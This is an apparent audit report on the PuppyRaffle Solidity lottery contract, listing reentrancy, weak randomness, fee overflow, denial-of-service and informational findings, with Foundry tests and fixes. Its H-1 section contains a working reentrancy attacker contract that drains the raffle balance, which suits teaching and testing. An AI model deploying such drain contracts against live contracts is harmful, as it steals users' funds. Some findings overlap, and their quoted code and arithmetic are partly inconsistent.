# Highs

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance
**Description:** The `PuppyRaffle::refund` doesn't follow the checks-effects-interactions pattern. As a result, it is vulnerable to reentrancy attacks. The function is called when a player refunds their entrance fee. However, it does not check if the raffle is over before refunding the player. This allows a player to drain the raffle balance by calling `refund` multiple times.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
​
@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);
​
    emit RaffleRefunded(playerAddress);
}
```

**Impact:** The raffle balance can be drained by a malicious player calling `refund` multiple times.

**Proof of Concept:**
**Proof of Concept:**
​
1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the PuppyRaffle balance.
​
<details>
<summary>PoC Code</summary>
​
Add the following to `PuppyRaffle.t.sol`
​
    ```solidity
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;
​
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }
​
    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }
​
    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
​
    fallback() external payable {
        _stealMoney();
    }
​
    receive() external payable {
        _stealMoney();
    }
}
​
// test to confirm vulnerability
function testCanGetRefundReentrancy() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
​
    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);
​
    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
​
    // attack
​
    vm.prank(attacker);
    attackerContract.attack{value: entranceFee}();
​
    // impact
    console.log("attackerContract balance: ", startingAttackContractBalance);
    console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
    console.log("ending attackerContract balance: ", address(attackerContract).balance);
    console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
}
    ```
</details>

**Recomended Mitigation:** 
1. **Use CEI pattern:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well. 

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

2. **Use ReentrancyGuard:**
Alternatively, you can use [OpenZeppelin's ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) modifier. This prevents a function from being called while it is already executing.

> **Note:** The `nonReentrant` modifier works by using a mutex lock (a boolean flag) that is set to true when the function starts and set back to false when it ends. If the function is re-entered while the flag is true, the transaction reverts.

```diff
+ import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";

- contract PuppyRaffle is ERC721, Ownable {}
+ contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {}

-   function refund(uint256 playerIndex) public {}
+   function refund(uint256 playerIndex) public nonReentrant {}
```



### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows validators to influence or predict the winner and influence or predict the winning puppy


**Description:** Hashing `msg.sender`, `block,timestamp` and `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

**Impact:** Validators can manipulate the randomness of the raffle to choose the winner of the raffle. This beats the purpose of the raffle and allows the validators to influence or predict the winning puppy.

**Proof of Concept:** 1. Validators can know the values of `block.timestamp` and `block.difficulty` ahead of time and usee that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy.

Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recomended Mitigation:** Use a VRF (Verifiable Random Function) to generate random numbers. This will allow the randomness to be verifiable by the validators and users.

### [H-3] Integer Overflow of `totalFees` loses fees

**Description:** In `PuppyRaffle::selectWinner`, `totalFees` is defined as a `uint64`. This is an unsafe type casting from `uint256`.

```javascript
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);
```

**Impact:** In Solidity versions prior to `0.8.0`, integers would overflow without reverting. 

1. `fee`:  max value is `18.446744073709551615` ETH. If the `fee` calculated is higher than this value, it will be truncated to a lower value. 
2. `totalFees`: If the accumulated fees exceed the max value of `uint64`, it will overflow and reset to a lower value.

This results in the protocol thinking it has less fees to withdraw than it actually does, leading to a loss of funds for the protocol owner.

**Proof of Concept:**

1. We have 89 players enter the raffle. Each pays 1 ETH. 
2. Total Collected: 89 ETH. 
3. Fee: 17.8 ETH. 
4. Max `uint64`: ~18.44 ETH. 
5. `uint64(20 ETH)` will overflow/truncate. 

<details>
<summary>Proof of Code</summary>

```solidity
function testTotalFeesOverflow() public playersEntered {
    // We finish a raffle of 4 to collect some fees
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();
    uint256 startingTotalFees = puppyRaffle.totalFees();
    // startingTotalFees = 800000000000000000

    // We then have a strong raffle with 89 players
    uint256 playersNum = 89;
    address[] memory players = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
    
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();

    uint256 endingTotalFees = puppyRaffle.totalFees();
    console.log("Ending total fees: ", endingTotalFees);
    assert(endingTotalFees < startingTotalFees + 20 ether);
}
```
</details>

**Recommended Mitigation:** 
1. Use a newer version of Solidity that does not allow integer overflows by default.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```

Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's SafeMath to prevent integer overflows.

2. Use a `uint256` instead of a `uint64` for `totalFees`.

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
```

3. Remove the balance check in `PuppyRaffle::withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

We additionally want to bring your attention to another attack vector as a result of this line in a future finding.


# Medium

### [M-1] Checking For Duplicate Players in `PuppyRaffle::enterRaffle` by Looping through The Players Array is a Potential DOS Attack Incrementing Gas Costs For Future Entrants

**Description:** The `PuppyRaffle::enterRaffle` function iterates through the `players` array to check for duplicates. However, it performs this check using a nested loop, comparing each player to every other player in the array. This implementation creates a quadratic time complexity O(n^2) relative to the number of players.

``` solidity
// @audit Dos Attack
for(uint256 i = 0; i < players.length -1; i++){
    for(uint256 j = i+1; j< players.length; j++){
    require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
  }
}
```

**Impact:** The gas costs for entering the raffle will significantly increase as more players join. This is due to the quadratic increase in the number of comparisons required to check for duplicates. Eventually, the gas cost to enter the raffle will exceed the block gas limit, creating a Denial of Service (DoS) vulnerability where no new players can enter the raffle. 

**Proof of Concept:**

If we have 2 sets of 150 players enter, the gas costs will be as such:
- 1st 150 players: ~12873449 gas
- 2nd 150 players: ~40998589 gas

This is more than 3x more expensive for the second 150 players.

<details>
<summary>Proof of Code</summary>

```solidity
function testDenialOfService() public {
      // Foundry lets us set a gas price
      vm.txGasPrice(1);

      // Creates 150 addresses
      uint256 playersNum = 150;
      address[] memory players = new address[](playersNum);
      for (uint256 i = 0; i < players.length; i++) {
          players[i] = address(i);
      }

      // Gas calculations for first 150 players
      uint256 gasStart = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
      uint256 gasEnd = gasleft();
      uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
      console.log("Gas cost of the first 150 players: ", gasUsedFirst);

      // Creates another array of 150 players
      address[] memory playersTwo = new address[](playersNum);
      for (uint256 i = 0; i < playersTwo.length; i++) {
          playersTwo[i] = address(i + playersNum);
      }

      // Gas calculations for second 150 players
      uint256 gasStartTwo = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
      uint256 gasEndTwo = gasleft();
      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
      console.log("Gas cost of the second 150 players: ", gasUsedSecond);

      assert(gasUsedSecond > gasUsedFirst);
  }
```
</details>

**Recommended Mitigation:** 
1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }

-   // Check for duplicates
-   for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    }
```

3. Alternatively, you could use [OpenZeppelin's EnumerableSet library](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet).


### [M-2] Balance check on PuppyRaffle::withdrawFees enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals
**Description:** The PuppyRaffle::withdrawFees function checks the totalFees equals the ETH balance of the contract (address(this).balance). Since this contract doesn't have a payable fallback or receive function, you'd think this wouldn't be possible, but a user could selfdesctruct a contract with ETH in it and force funds to the PuppyRaffle contract, breaking this check.

```solidity
    function withdrawFees() external {
@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

**Impact:** This would prevent the feeAddress from withdrawing fees. A malicious user could see a withdrawFee transaction in the mempool, front-run it, and block the withdrawal by sending fees.

**Proof of Concept:**

1. PuppyRaffle has 800 wei in it's balance, and 800 totalFees.
2. Malicious user sends 1 wei via a selfdestruct
3. feeAddress is no longer able to withdraw funds

**Recommended Mitigation:** Remove the balance check on the PuppyRaffle::withdrawFees function.

```solidity
    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

### [M-3] Unsafe cast of PuppyRaffle::fee loses fees
**Description:** In PuppyRaffle::selectWinner their is a type cast of a uint256 to a uint64. This is an unsafe cast, and if the uint256 is larger than type(uint64).max, the value will be truncated.
```solidity
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```
The max value of a uint64 is 18446744073709551615. In terms of ETH, this is only ~18 ETH. Meaning, if more than 18ETH of fees are collected, the fee casting will truncate the value.

**Impact:** This means the feeAddress will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the fee as a uint64 hits
3. totalFees is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:
```solidity
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```
**Recommended Mitigation:** Set PuppyRaffle::totalFees to a uint256 instead of a uint64, and remove the casting. Their is a comment which says:

// We do some storage packing to save gas
But the potential gas saved isn't worth it if we have to recast and this bug exists.

```solidity
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [M-4] Smart Contract wallet raffle winners without a receive or a fallback will block the start of a new contest
**Description:** The PuppyRaffle::selectWinner function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The PuppyRaffle::selectWinner function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:**

1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The selectWinner function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)



# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and players at index 0 causing players to incorrectly think they have not entered the raffle

**Description:** In `PuppyRaffle::getActivePlayerIndex`, the function returns 0 for non-existent players and players at index 0.

```solidity
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }

```

**Impact:** This can cause players at index 0 to incorrectly think they have not entered the raffle.

**Proof of Concept:**
1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation

```solidity
function testGetActivePlayerIndex() public {
    PuppyRaffle puppyRaffle = new PuppyRaffle();
    uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(0));
    assert(playerIndex == 0);
}
```

**Recommended Mitigation:**
The easiest recommendation would be to revert if the player is not in the array instead of returning 0.
​
You could also reserve the 0th position for any competition, but an even better solution might be to return an `int256` where the function returns -1 if the player is not active.


# Gas

### [G-1] Unchanged state variables should be marked as `constant` or `immutable`
Reading from storage is much more expensive than reading from a `constant` or `immutable` variable.

```diff
- uint256 public raffleDuration;
+ uint256 public immutable raffleDuration;

- string private commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
+ string private constant commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";

- string private rareImageUri = "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";
+ string private constant rareImageUri = "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";

- string private legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
+ string private constant legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
```

### [G-2] Storage variables in a loop should be cached
Calling `.length` on a storage array in a loop condition is expensive. Consider caching the length in a local variable in memory before the loop and reusing it.

<details><summary>3 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 94](src/PuppyRaffle.sol#L94)

    ```solidity
            for (uint256 i = 0; i < players.length - 1; i++) {
    ```

- Found in src/PuppyRaffle.sol [Line: 95](src/PuppyRaffle.sol#L95)

    ```solidity
                for (uint256 j = i + 1; j < players.length; j++) {
    ```

- Found in src/PuppyRaffle.sol [Line: 122](src/PuppyRaffle.sol#L122)

    ```solidity
            for (uint256 i = 0; i < players.length; i++) {
    ```

</details>


### [1-1] Unspecific Solidity Pragma

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

    ```solidity
    pragma solidity ^0.7.6;
    ```

</details>


### [I-2] Using an outdated solidity version isn't recommended
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation:**
Deploy with a recent version of Solidity (at least 0.8.18) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### [I-3]  Address State Variable Set `Without Checks

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 68](src/PuppyRaffle.sol#L68)

    ```solidity
            feeAddress = _feeAddress;
    ```

- Found in src/PuppyRaffle.sol [Line: 197](src/PuppyRaffle.sol#L197)

    ```solidity
            feeAddress = newFeeAddress;
    ```

### [I-4] does not follow CEI, which is not a best practice
​
It's best to keep code clean and follow CEI (Checks, Effects, Interactions).
​
    ```diff
-   (bool success,) = winner.call{value: prizePool}("");
-   require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+   (bool success,) = winner.call{value: prizePool}("");
+   require(success, "PuppyRaffle: Failed to send prize pool to winner");
    ```

### [I-5] Use of "magic" numbers is not advisable

​It can be confusing to see number literals in a codebase, and it's much more readable if the numbers are given a name.
​
Examples:
    ```solidity
    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant POOL_PRECISION = 100;
​
    uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;
    uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;
    ```  

### [I-6] State Changes are Missing Events
​
A lack of emitted events can often lead to difficulty of external or front-end systems to accurately track changes within a protocol.
​
It is best practice to emit an event whenever an action results in a state change.
​
Examples:
- `PuppyRaffle::totalFees` within the `selectWinner` function
- `PuppyRaffle::raffleStartTime` within the `selectWinner` function
- `PuppyRaffle::totalFees` within the `withdrawFees` function

### [I-7] _isActivePlayer is never used and should be removed
​
**Description:** The function PuppyRaffle::_isActivePlayer is never used and should be removed.
​
    ```diff
    -    function _isActivePlayer() internal view returns (bool) {
    -        for (uint256 i = 0; i < players.length; i++) {
    -            if (players[i] == msg.sender) {
    -                return true;
    -            }
    -        }
    -        return false;
    -    }
    ```